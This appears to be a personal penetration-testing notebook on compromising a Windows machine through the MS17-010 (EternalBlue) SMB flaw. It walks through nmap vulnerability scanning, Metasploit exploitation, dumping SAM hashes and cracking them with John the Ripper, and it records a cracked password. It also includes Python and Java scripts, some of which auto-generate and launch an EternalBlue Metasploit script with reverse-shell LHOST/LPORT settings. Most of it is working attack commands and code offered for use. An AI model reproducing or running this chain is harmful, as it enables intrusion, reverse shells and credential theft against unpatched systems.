# System Compromise

 - Detect the IPs using arp scan 
 - ```sudo nmap -O  (ip)```
 - Hopping- The intermediate servers interconnecting the path to final destination domain are strolled on by the request
 - ```nmap -A -vvv angryip.org```- traceroute at the end
 - Scan the Windows Machine IP
 - ```sudo nmap -Pn -sV --script vuln -oN  Winnpsv.txt```
 - We are Able to list the ports with the services running on them and the vulnerability with SMB
 - check for the services of those ports in tcp_udp wiki and on 445 port we find the service SMB
 - Copy the Vulnerability name and search for it
 - Rapid7(Creators of Rapid7) Article is seen.
 - ```searchsploit smb-vuln-ms17-010```
 - ```sudo msfconsole -q```
 - (-q for no banner)
 - ```search ms17-010```
 - ```use 0```
 - ```show options```
 - set the Lhost and Rhost using set RHOST ---- and set LHOST ----
 - ```exploit```
 - ```--help```
 - ```hashdump```(dumps the content of SAM Data base in has format)
 - Copy the contents of John and creat a file to save it
 - Now we use Johntheripper
 - ```john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hasn-win7```(SAM database is encrypted with NTLM)
 - password-alqfna22
## Automation
 - [ ] [autoscan/MS17-010 EternalBlue at main · vaishnavucv/autoscan (github.com)](https://github.com/vaishnavucv/autoscan/tree/main/MS17-010%20EternalBlue)
 - [ ]  We will see how to automate scan with coding
 - [ ]  After Downloading the script with wget.
 - [ ] Give the Execution permissions
 - [ ] Run the ms17-010-scanner.sh(./)
 - [ ] Now  Enter the Values asked
 - [ ] The automated process takes place
 - [ ] ```import subprocess
import re

def main():
    # Ask for the IP address and scan file name
    scan_ip = input("Enter the IP address to scan: ")
    scan_name = input("Enter the scan report file name: ")

    # Perform the scan without showing output in the terminal
    print(f"Scanning {scan_ip} for vulnerabilities on port 445, please wait...")
    subprocess.run(["nmap", "--script", "smb-vuln-ms17-010", "-p445", scan_ip, "-vv", "-oN", scan_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Check if the output file contains the vulnerability details
    with open(scan_name, 'r') as file:
        scan_results = file.read()

    if re.search(r"VULNERABLE:", scan_results):
        print(f"The IP {scan_ip} is VULNERABLE to MS17-010.")
        print("Details found in the report:")
        # Display the vulnerability details from the report
        vuln_details = re.findall(r"VULNERABLE:.*", scan_results, re.DOTALL)
        if vuln_details:
            for detail in vuln_details:
                print(detail)
    else:
        print(f"The IP {scan_ip} does NOT appear to be vulnerable to MS17-010.")

    # Instruct the user to open the report with their preferred text editor
    print(f"Please open the scan report named '{scan_name}' with your preferred text editor to view the details.")
if __name__ == "__main__":
    main()```
```java
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Scanner;

public class EternalBlueScanner {

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        System.out.println("                                                    _ _____      ___  _  ___");
        System.out.println("                                      _ __ ___  ___/ |___  |    / _ \\/ |/ _ \\");
        System.out.println("╔═╗┌┬┐┌─┐┬─┐┌┐┌┌─┐┬  ╔╗ ┬  ┬ ┬┌─┐    | '_ ` _ \\/ __| |  / /____| | | | | | | |");
        System.out.println("║╣  │ ├┤ ├┬┘│││├─┤│  ╠╩╗│  │ │├┤     | | | | | \\__ \\ | / /_____| |_| | | |_| |");
        System.out.println("╚═╝ ┴ └─┘┴└─┘└┘┴ ┴┴─┘╚═╝┴─┘└─┘└─┘    |_| |_| |_|___/_|/_/       \\___/|_|\\___/");
        System.out.println("                                http://github.com/vaishnavu/");

        System.out.print("Enter the IP Address to scan: ");
        String scanIp = scanner.nextLine();
        System.out.print("Enter the Scan Name: ");
        String scanName = scanner.nextLine();

        System.out.println("Scanning " + scanIp + " for Vulnerability on port 445...");
        
        try {
            Process process = new ProcessBuilder("nmap", "--script", "smb-vuln-ms17-010", "-p445", scanIp, "-vv", "-oN", scanName + ".txt").start();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }

        boolean isVulnerable = false;
        try (BufferedReader reader = new BufferedReader(new FileReader(scanName + ".txt"))) {
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("VULNERABLE:")) {
                    isVulnerable = true;
                    break;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        if (isVulnerable) {
            System.out.println("The IP " + scanIp + " is VULNERABLE to CVE-2017-0143 (ms17-010)");
            try (BufferedReader reader = new BufferedReader(new FileReader(scanName + ".txt"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("VULNERABLE:")) {
                        for (int i = 0; i < 7; i++) { // Display 6 lines after the "VULNERABLE:" line
                            System.out.println(line);
                            line = reader.readLine();
                            if (line == null) {
                                break;
                            }
                        }
                        break;
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("The IP " + scanIp + " is not VULNERABLE to CVE-2017-0143 (ms17-010)");
        }

        try {
            new ProcessBuilder("mousepad", scanName + ".txt").start();
        } catch (IOException e) {
            e.printStackTrace();
        }

        scanner.close();
    }
}```


# For Executing the Exploit

```java
import java.io.*;
import java.util.Scanner;

public class VulnerabilityScanner {

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        // Print ASCII art
        System.out.println("");
        System.out.println(" ██████╗██╗   ██╗███████╗    ██████╗  ██████╗  ██╗███████╗       ██████╗  ██╗██╗  ██╗██████╗ ");
        System.out.println("██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗███║╚════██║      ██╔═████╗███║██║  ██║╚════██╗");
        System.out.println("██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║╚██║    ██╔╝█████╗██║██╔██║╚██║███████║ █████╔╝");
        System.out.println("██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║ ██║   ██╔╝ ╚════╝████╔╝██║ ██║╚════██║ ╚═══██╗");
        System.out.println("╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝ ██║   ██║        ╚██████╔╝ ██║     ██║██████╔╝");
        System.out.println(" ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝  ╚═╝   ╚═╝         ╚═════╝  ╚═╝     ╚═╝╚═════╝ ");
        System.out.println("                        https://github.com/vaishnavucv/");
        System.out.println("");

        // Ask for the IP address and scan file name
        System.out.print("Enter the IP Address to scan: ");
        String ipAddress = scanner.nextLine();
        System.out.print("Enter the Scan Name: ");
        String scanName = scanner.nextLine();

        System.out.println("Scanning for the " + ipAddress + ", looking for 445...");

        // Perform the scan
        try {
            Process process = new ProcessBuilder("nmap", "-p445", "-sV", "-vv", "-oN", scanName + "-service-enum.txt", ipAddress).start();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }

        // Check if port 445 is open
        boolean isPortOpen = false;
        try (BufferedReader reader = new BufferedReader(new FileReader(scanName + "-service-enum.txt"))) {
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("445/tcp")) {
                    isPortOpen = true;
                    String[] parts = line.split("\\s+");
                    System.out.println("Port 445 is open");
                    System.out.println("Service running on port 445: " + parts[2] + " " + parts[3]);
                    break;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        if (isPortOpen) {
            System.out.println("Performing Vulnerability scan on port 445...");
            try {
                Process process = new ProcessBuilder("nmap", "-p445", "-vv", "--script", "smb-vuln-ms17-010", "-oN", scanName + "-enum-vuln.txt", ipAddress).start();
                process.waitFor();
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }

            // Check if MS17-010 vulnerability is detected
            boolean isVulnerable = false;
            try (BufferedReader reader = new BufferedReader(new FileReader(scanName + "-enum-vuln.txt"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("VULNERABLE:")) {
                        isVulnerable = true;
                        break;
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

            if (isVulnerable) {
                System.out.println("MS17-010 vulnerability is detected.....");
                System.out.println("Preparing EXPLOIT config script...!");

                // Ask for LHOST and LPORT
                System.out.print("Enter the LHOST for reverse TCP connection: ");
                String lhost = scanner.nextLine();
                System.out.print("Enter the LPORT for reverse TCP connection: ");
                String lport = scanner.nextLine();

                // Create Metasploit config script
                String msf6Rc = scanName + ".rc";
                try (BufferedWriter writer = new BufferedWriter(new FileWriter(msf6Rc))) {
                    writer.write("use exploit/windows/smb/ms17_010_eternalblue\n");
                    writer.write("show options\n");
                    writer.write("set rhost " + ipAddress + "\n");
                    writer.write("set lhost " + lhost + "\n");
                    writer.write("set lport " + lport + "\n");
                    writer.write("clear\n");
                    writer.write("show options\n");
                    writer.write("sleep 5\n");
                    writer.write("clear\n");
                    writer.write("exploit\n");
                } catch (IOException e) {
                    e.printStackTrace();
                }

                System.out.println("Metasploit Auto-script is created =>=> " + msf6Rc);
                System.out.println("Starting msfconsole....");
                try {
                    new ProcessBuilder("msfconsole", "-q", "-r", msf6Rc).start();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            } else {
                System.out.println("MS17-010 vulnerability NOT detected, No Further action...");
                System.out.println("exiting...!");
            }
        } else {
            System.out.println("Port 445 is CLOSED...");
            System.out.println("Skipping Vulnerability scan...!");
        }

        scanner.close();
    }
}

```

```python
import subprocess
import re

def main():
    # Print ASCII art
    print("")
    print(" ██████╗██╗   ██╗███████╗    ██████╗  ██████╗  ██╗███████╗       ██████╗  ██╗██╗  ██╗██████╗ ")
    print("██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗███║╚════██║      ██╔═████╗███║██║  ██║╚════██╗")
    print("██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║╚██║    ██╔╝█████╗██║██╔██║╚██║███████║ █████╔╝")
    print("██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║ ██║   ██╔╝ ╚════╝████╔╝██║ ██║╚════██║ ╚═══██╗")
    print("╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝ ██║   ██║        ╚██████╔╝ ██║     ██║██████╔╝")
    print(" ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝  ╚═╝   ╚═╝         ╚═════╝  ╚═╝     ╚═╝╚═════╝ ")
    print("                        https://github.com/vaishnavucv/")
    print("")

    # Ask for the IP address and scan file name
    ip_address = input("Enter the IP Address to scan: ")
    scan_name = input("Enter the Scan Name: ")

    print(f"Scanning for the {ip_address}, looking for 445...")
    print("")

    # Perform the scan
    subprocess.run(["nmap", "-p445", "-sV", "-vv", "-oN", f"{scan_name}-service-enum.txt", ip_address], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Check if port 445 is open
    is_port_open = False
    with open(f"{scan_name}-service-enum.txt", "r") as file:
        for line in file:
            if "445/tcp" in line:
                is_port_open = True
                parts = re.split(r'\s+', line)
                print("Port 445 is open")
                print(f"Service running on port 445: {parts[2]} {parts[3]}")
                break

    if is_port_open:
        print("Performing Vulnerability scan on port 445...")
        subprocess.run(["nmap", "-p445", "-vv", "--script", "smb-vuln-ms17-010", "-oN", f"{scan_name}-enum-vuln.txt", ip_address], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("")

        # Check if MS17-010 vulnerability is detected
        is_vulnerable = False
        with open(f"{scan_name}-enum-vuln.txt", "r") as file:
            for line in file:
                if "VULNERABLE:" in line:
                    is_vulnerable = True
                    break

        if is_vulnerable:
            print("MS17-010 vulnerability is detected.....")
            print("Preparing EXPLOIT config script...!")

            # Ask for LHOST and LPORT
            lhost = input("Enter the LHOST for reverse TCP connection: ")
            lport = input("Enter the LPORT for reverse TCP connection: ")

            # Create Metasploit config script
            msf6_rc = f"{scan_name}.rc"
            with open(msf6_rc, "w") as file:
                file.write("use exploit/windows/smb/ms17_010_eternalblue\n")
                file.write("show options\n")
                file.write(f"set rhost {ip_address}\n")
                file.write(f"set lhost {lhost}\n")
                file.write(f"set lport {lport}\n")
                file.write("clear\n")
                file.write("show options\n")
                file.write("sleep 5\n")
                file.write("clear\n")
                file.write("exploit\n")

            print(f"Metasploit Auto-script is created =>=> {msf6_rc}")
            print("Starting msfconsole....")
            subprocess.run(["msfconsole", "-q", "-r", msf6_rc])
        else:
            print("MS17-010 vulnerability NOT detected, No Further action...")
            print("exiting...!")
    else:
        print("Port 445 is CLOSED...")
        print("Skipping Vulnerability scan...!")

if __name__ == "__main__":
    main()
```




## arp scan
- ```sudo arp-scan -l -I eth0```
